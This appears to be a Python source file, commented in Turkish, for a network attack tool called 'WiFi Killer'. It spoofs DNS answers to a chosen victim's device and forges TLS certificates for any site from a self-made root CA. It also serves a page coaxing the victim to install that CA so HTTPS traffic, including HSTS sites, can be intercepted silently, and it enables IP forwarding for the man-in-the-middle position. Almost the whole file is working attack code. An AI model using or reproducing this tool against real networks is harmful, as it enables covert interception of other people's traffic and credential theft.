import os
import re
import ssl
import subprocess
import tempfile
import threading
from collections import Counter
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from scapy.all import DNS, DNSQR, DNSRR, Ether, IP, UDP, conf, getmacbyip, sendp, sniff


import datetime
import ipaddress

from cryptography import x509
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID

TLS_PORT = 443

_CA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")
_CA_KEY = os.path.join(_CA_DIR, "wifi_killer_ca.key")
_CA_CERT = os.path.join(_CA_DIR, "wifi_killer_ca.pem")

_ca = None
_leaf_cache = {}


def get_ca():
    """Kok CA'yi yukler; yoksa uretip proje dizinine kalici olarak yazar."""
    global _ca
    if _ca is not None:
        return _ca
    os.makedirs(_CA_DIR, exist_ok=True)
    if os.path.exists(_CA_KEY) and os.path.exists(_CA_CERT):
        with open(_CA_KEY, "rb") as f:
            key = serialization.load_pem_private_key(f.read(), password=None)
        with open(_CA_CERT, "rb") as f:
            cert = x509.load_pem_x509_certificate(f.read())
    else:
        key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
        now = datetime.datetime.now(datetime.timezone.utc)
        subject = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "WiFiKiller CA")])
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(subject)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(now - datetime.timedelta(days=1))
            .not_valid_after(now + datetime.timedelta(days=3650))
            .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
            .add_extension(
                x509.KeyUsage(
                    digital_signature=False, content_commitment=False,
                    key_encipherment=False, data_encipherment=False,
                    key_agreement=False, key_cert_sign=True, crl_sign=True,
                    encipher_only=False, decipher_only=False,
                ),
                critical=True,
            )
            .sign(key, hashes.SHA256())
        )
        with open(_CA_KEY, "wb") as f:
            f.write(
                key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption(),
                )
            )
        with open(_CA_CERT, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
    _ca = (key, cert)
    return _ca


def ca_pem_bytes():
    _, cert = get_ca()
    return cert.public_bytes(serialization.Encoding.PEM)


def make_leaf_context(server_name: str) -> ssl.SSLContext:
    """SNI'ya gore CA tarafindan imzali leaf sertifika uretir (cache'li)."""
    if server_name in _leaf_cache:
        return _leaf_cache[server_name]
    ca_key, ca_cert = get_ca()
    leaf_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    san = []
    try:
        san.append(x509.IPAddress(ipaddress.ip_address(server_name)))
    except ValueError:
        san.append(x509.DNSName(server_name))
    now = datetime.datetime.now(datetime.timezone.utc)
    leaf = (
        x509.CertificateBuilder()
        .subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, server_name)]))
        .issuer_name(ca_cert.subject)
        .public_key(leaf_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=3650))
        .add_extension(x509.SubjectAlternativeName(san), critical=False)
        .add_extension(
            x509.KeyUsage(
                digital_signature=True, content_commitment=False,
                key_encipherment=True, data_encipherment=False,
                key_agreement=False, key_cert_sign=False, crl_sign=False,
                encipher_only=False, decipher_only=False,
            ),
            critical=True,
        )
        .add_extension(
            x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), critical=False
        )
        .sign(ca_key, hashes.SHA256())
    )
    d = tempfile.mkdtemp(prefix="wkleaf_")
    certfile = os.path.join(d, "cert.pem")
    keyfile = os.path.join(d, "key.pem")
    with open(certfile, "wb") as f:
        f.write(leaf.public_bytes(serialization.Encoding.PEM))
        f.write(ca_pem_bytes())  # tam zincir: leaf + CA
    with open(keyfile, "wb") as f:
        f.write(
            leaf_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            )
        )
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
    _leaf_cache[server_name] = ctx
    return ctx


def _sni_callback(ssl_sock, server_name, _ctx):
    if server_name:
        try:
            ssl_sock.context = make_leaf_context(server_name)
        except Exception:
            pass


DEFAULT_PAGE = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>WiFi Killer</title>
<style>body{{background:#111;color:#eee;font-family:sans-serif;display:flex;
align-items:center;justify-content:center;height:100vh;margin:0}}
div{{text-align:center}}h1{{font-size:3em}}</style></head>
<body><div><h1>{title}</h1><p>{message}</p>
<p><a style="color:#6cf" href="/ca">CA sertifikasini indir (kurarsan HTTPS de calisir)</a></p>
</div></body></html>"""

INSTALL_PAGE = """<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>WiFi Killer - CA Kurulumu</title>
<style>body{{background:#111;color:#eee;font-family:sans-serif;max-width:680px;
margin:auto;padding:24px;line-height:1.6}}code{{background:#222;padding:2px 6px;
border-radius:4px;color:#6cf}}a{{color:#6cf}}</style></head>
<body><h1>CA Sertifikasi Kurulumu</h1>
<p>Bu sertifikayi cihazina kurarsan, yonlendirme <b>HSTS'li siteler (Google,
YouTube, Instagram, X...)</b> dahil tum HTTPS trafiginde uyarisiz calisir.</p>
<p><a href="/ca">>> CA sertifikasini indir (wifi_killer_ca.crt)</a></p>
<h2>Android</h2>
<ol>
<li>Yukaridaki baglantidan dosyayi indir.</li>
<li>Ayarlar > Guvenlik > "Yeni bir yukleyici ayarlari yukle" / "Sertifika yukle"
   (cihaza gore "WiFiKiller CA" olarak gorunur).</li>
<li>VPN ve uygulama kimlik bilgileri > Kullanici'nin altinda "WiFiKiller CA"
   secili oldugunu dogrula.</li>
<li>Tarayiciyi kapatip ac; HTTPS siteler artik uyarısiz yonlenir.</li>
</ol>
<h2>iPhone / iPad</h2>
<ol>
<li>Baglantiyi Safari ile ac, profil olarak indir ve Ayarlar'dan yukle.</li>
<li>Ayarlar > Genel > Cihaz Yonetimi'nden "WiFiKiller CA"ya guven ver.</li>
</ol>
<p>Not: Sertifika yuklu degilken sadece HTTP trafigi ve "Devam et"
denilebilen HTTPS siteleri yonlenir.</p>
</body></html>"""


class QuietServer(ThreadingHTTPServer):
    """TLS el sikisma hatalarini vs. sessizce yutan sunucu."""

    def handle_error(self, request, client_address):
        pass


class PageServer:
    """
    Kurbanin tarayicisini karsilayan sunucu.

    - Port 80  : HTTP -> ya 302 (redirect_url) ya da mesaj sayfasi
    - Port 443 : HTTPS -> ayni cevap, kendinden imzali sertifikayla.
      Modern tarayicilar yazilan adresi otomatik https'e yukselttigi icin
      sart: kurban sertifikaya 'devam et' dediginde yonlendirme tetiklenir.
    """

    def __init__(
        self,
        title="Internet Kesildi",
        message="Bu agin yoneticisi baglantini gecici olarak durdurdu.",
        port=80,
        redirect_url=None,
        host_ip="",
    ):
        self.port = port
        self.message = message
        self.redirect_url = redirect_url
        self.tls_active = False
        self.request_count = 0
        ca_data = ca_pem_bytes()
        message = message or "Bu agin yoneticisi baglantini gecici olarak durdurdu."
        page_html = DEFAULT_PAGE.format(title=title, message=message)
        server_ref = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *args):
                pass

            def _serve_ca(self):
                self.send_response(200)
                self.send_header("Content-Type", "application/x-x509-ca-cert")
                self.send_header(
                    "Content-Disposition",
                    'attachment; filename="wifi_killer_ca.crt"',
                )
                self.send_header("Content-Length", str(len(ca_data)))
                self.end_headers()
                self.wfile.write(ca_data)

            def _serve_install(self):
                html = INSTALL_PAGE
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(html.encode("utf-8"))

            def _respond(self):
                server_ref.request_count += 1
                if redirect_url:
                    self.send_response(302)
                    self.send_header("Location", redirect_url)
                    self.end_headers()
                    return
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(page_html.encode("utf-8"))

            def do_GET(self):
                path = self.path.split("?", 1)[0].rstrip("/")
                if path in ("/ca", "/ca.crt", "/ca.pem"):
                    self._serve_ca()
                    return
                if path in ("/install", "/yukle"):
                    self._serve_install()
                    return
                self._respond()

            do_POST = do_GET
            do_HEAD = do_GET

        self._servers = [QuietServer(("0.0.0.0", port), Handler)]
        try:
            default_ctx = make_leaf_context("wifikiller.local")
            default_ctx.set_servername_callback(_sni_callback)
            tls_srv = QuietServer(("0.0.0.0", TLS_PORT), Handler)
            tls_srv.socket = default_ctx.wrap_socket(
                tls_srv.socket, server_side=True
            )
            self._servers.append(tls_srv)
            self.tls_active = True
        except Exception:
            pass

        self._threads = []

    def start(self):
        for srv in self._servers:
            t = threading.Thread(target=srv.serve_forever, daemon=True)
            t.start()
            self._threads.append(t)

    def stop(self):
        for srv in self._servers:
            try:
                srv.shutdown()
                srv.server_close()
            except Exception:
                pass

    @staticmethod
    def open_firewall(ports=(80, TLS_PORT)):
        if os.name != "nt":
            return
        for port in ports:
            subprocess.run(
                [
                    "netsh",
                    "advfirewall",
                    "firewall",
                    "add",
                    "rule",
                    "name=WiFiKillerHTTP",
                    "dir=in",
                    "action=allow",
                    "protocol=TCP",
                    f"localport={port}",
                ],
                capture_output=True,
            )


class DnsRedirector:
    """
    Hedefin DNS sorgularini yakalayip sahte cevap gonderir.

    - A (IPv4) sorgulari     -> redirect_ip (bizim sayfamiz / 302)
    - AAAA / HTTPS(SVCB) vb. -> bos cevap; cihaz IPv6 veya HTTPS kaydiyla
                                gercek sunucuya sipip kontrolu atlamasin
    - passthrough_domains    -> hic dokunulmaz, gercek trafik akar
      (ornegin x.com'un kendisi boyle gecer, sertifika hatasi olmaz)
    """

    def __init__(
        self,
        target_ip: str,
        redirect_ip: str = None,
        domains: list = None,
        passthrough_domains: list = None,
    ):
        self.target_ip = target_ip
        self.iface, self.my_ip, _ = conf.route.route("8.8.8.8")
        self.target_mac = getmacbyip(target_ip)
        self.redirect_ip = redirect_ip or self.my_ip
        self.domains = {d.lower().strip(".") for d in domains} if domains else None
        self.passthrough_domains = [
            d.lower().strip("/") for d in passthrough_domains or []
        ]
        self.running = False
        self.hits = 0
        self.passed_hits = 0
        self.last_domain = ""
        self.domain_counts = Counter()
        self._stop_event = threading.Event()
        self._thread = None

    def top_domains(self, n: int = 5):
        return self.domain_counts.most_common(n)

    def _should_redirect(self, qname: str) -> bool:
        if not self.domains:
            return True
        return any(qname == d or qname.endswith("." + d) for d in self.domains)

    def _is_passthrough(self, qname: str) -> bool:
        return any(
            qname == base or qname.endswith("." + base)
            for base in self.passthrough_domains
        )

    def _handle_packet(self, pkt) -> None:
        if not (pkt.haslayer(DNS) and pkt.haslayer(DNSQR)):
            return
        dns_layer = pkt[DNS]
        if int(dns_layer.qr) != 0:
            return

        try:
            qname = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
            qtype = int(pkt[DNSQR].qtype)
        except Exception:
            return

        if self._is_passthrough(qname):
            self.passed_hits += 1
            self.last_domain = qname
            return

        if not self._should_redirect(qname):
            return

        if not self.target_mac:
            self.target_mac = getmacbyip(self.target_ip)
        if not self.target_mac:
            return

        # Sadece A kaydini sahteliyoruz; AAAA / HTTPS / TXT gibi diger tiplere
        # bos NOERROR donuyoruz ki cihazin alternatif yol bulmasi engellensin.
        answer = None
        if qtype == 1:
            answer = DNSRR(
                rrname=pkt[DNSQR].qname, type="A", ttl=10, rdata=self.redirect_ip
            )

        response = (
            Ether(dst=self.target_mac)
            / IP(src=pkt[IP].dst, dst=pkt[IP].src)
            / UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)
            / DNS(
                id=dns_layer.id,
                qr=1,
                aa=1,
                rd=1,
                ra=1,
                qdcount=1,
                ancount=1 if answer else 0,
                qd=dns_layer.qd,
                an=answer,
            )
        )
        sendp(response, iface=self.iface, verbose=False)
        sendp(response, iface=self.iface, verbose=False)
        self.hits += 1
        self.domain_counts[qname] += 1
        self.last_domain = qname

    def _loop(self):
        flt = f"udp and src host {self.target_ip} and dst port 53"
        reported_error = False
        while not self._stop_event.is_set():
            try:
                sniff(
                    iface=self.iface,
                    filter=flt,
                    prn=self._handle_packet,
                    store=False,
                    timeout=15,
                    stop_filter=lambda _pkt: self._stop_event.is_set(),
                )
            except Exception as exc:
                if not reported_error:
                    print(f"[!] {self.target_ip} DNS dinleyici hatasi: {exc}")
                    reported_error = True
                self._stop_event.wait(2)

    def start(self):
        self._stop_event.clear()
        self.running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=5)
        self.running = False


REG_KEY = r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters"

_iface_snapshot = {}

_IP_FORWARD = "/proc/sys/net/ipv4/ip_forward"


def _run_ps(command: str) -> str:
    result = subprocess.run(
        ["powershell", "-NoProfile", "-Command", command],
        capture_output=True,
        text=True,
        timeout=20,
    )
    return result.stdout.strip()


def _connected_iface_indexes() -> list:
    out = _run_ps(
        "(Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected "
        "| Where-Object InterfaceIndex -ne 1).InterfaceIndex"
    )
    indexes = []
    for line in out.splitlines():
        line = line.strip()
        if line.isdigit():
            indexes.append(int(line))
    return indexes


def _iface_forwarding_enabled(index: int) -> bool:
    out = _run_ps(
        f"(Get-NetIPInterface -InterfaceIndex {index} -AddressFamily IPv4).Forwarding"
    )
    return "enabled" in out.lower()


def _set_iface_forwarding(index: int, enabled: bool) -> bool:
    state = "Enabled" if enabled else "Disabled"
    out = _run_ps(
        f"Set-NetIPInterface -InterfaceIndex {index} -AddressFamily IPv4 -Forwarding {state}; "
        f"(Get-NetIPInterface -InterfaceIndex {index} -AddressFamily IPv4).Forwarding"
    )
    return ("enabled" in out.lower()) == enabled


def _linux_set_forwarding(enabled: bool) -> bool:
    """Linux/Termux'ta IP forwarding'i /proc/sys uzerinden acar/kapatir (root gerekir)."""
    try:
        with open(_IP_FORWARD, "w") as f:
            f.write("1" if enabled else "0")
        with open(_IP_FORWARD) as f:
            return f.read().strip() == ("1" if enabled else "0")
    except PermissionError:
        return False
    except OSError:
        return False


def _linux_forwarding_enabled() -> bool:
    try:
        with open(_IP_FORWARD) as f:
            return f.read().strip() == "1"
    except OSError:
        return False


def force_forwarding_off() -> None:
    """Onceki oturumdan kalma acik forwarding'i kapatir (program acilisinda cagrilir)."""
    global _iface_snapshot
    try:
        if os.name != "nt":
            _linux_set_forwarding(False)
            return
        for index in _connected_iface_indexes():
            _set_iface_forwarding(index, False)
        _iface_snapshot = {}
        subprocess.run(
            ["reg", "add", REG_KEY, "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", "0", "/f"],
            capture_output=True,
        )
    except Exception:
        pass


def get_forwarding_enabled() -> bool:
    if os.name != "nt":
        return _linux_forwarding_enabled()
    try:
        result = subprocess.run(
            ["reg", "query", REG_KEY, "/v", "IPEnableRouter"],
            capture_output=True,
            text=True,
        )
        match = re.search(r"IPEnableRouter\s+REG_DWORD\s+0x([0-9a-fA-F]+)", result.stdout)
        return bool(match and int(match.group(1), 16))
    except Exception:
        return False


def set_forwarding(enabled: bool) -> bool:
    """
    Paket yonlendirmeyi acar/kapatir.

    Windows'ta: IPEnableRouter registry + her arayuzun kendi Forwarding bayragi.
    Linux/Termux'ta: /proc/sys/net/ipv4/ip_forward (root gerekir).
    """
    if os.name != "nt":
        return _linux_set_forwarding(enabled)

    value = "1" if enabled else "0"
    subprocess.run(
        ["reg", "add", REG_KEY, "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", value, "/f"],
        capture_output=True,
    )

    ok_all = True
    if enabled:
        for index in _connected_iface_indexes():
            if index not in _iface_snapshot:
                _iface_snapshot[index] = _iface_forwarding_enabled(index)
            if not _set_iface_forwarding(index, True):
                ok_all = False
    else:
        for index, previous in list(_iface_snapshot.items()):
            _set_iface_forwarding(index, previous)
        _iface_snapshot.clear()

    return ok_all
